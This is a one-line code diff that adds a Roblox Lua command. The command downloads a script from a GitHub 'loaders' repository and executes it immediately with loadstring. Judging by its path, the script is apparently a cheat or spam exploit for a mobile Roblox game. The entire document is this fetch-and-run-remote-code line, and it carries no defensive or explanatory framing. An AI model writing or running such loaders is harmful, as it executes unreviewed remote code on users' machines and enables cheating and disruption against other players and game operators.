@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/path-2-mobile-dragon-generations-spam4-seznan78h0351r.lua"))()
